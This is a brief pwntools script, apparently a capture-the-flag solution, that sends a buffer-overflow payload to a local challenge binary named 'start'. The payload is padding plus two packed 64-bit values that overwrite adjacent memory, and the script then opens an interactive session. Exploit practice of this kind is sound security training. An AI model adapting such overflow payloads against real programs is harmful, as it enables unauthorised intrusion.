from pwn import*
p = process('./start')

payload = "1"*24+p64(0x7FFFFFFFFFFFFFFF)+p64(0x3fb999999999999a)
p.send(payload)

p.interactive()
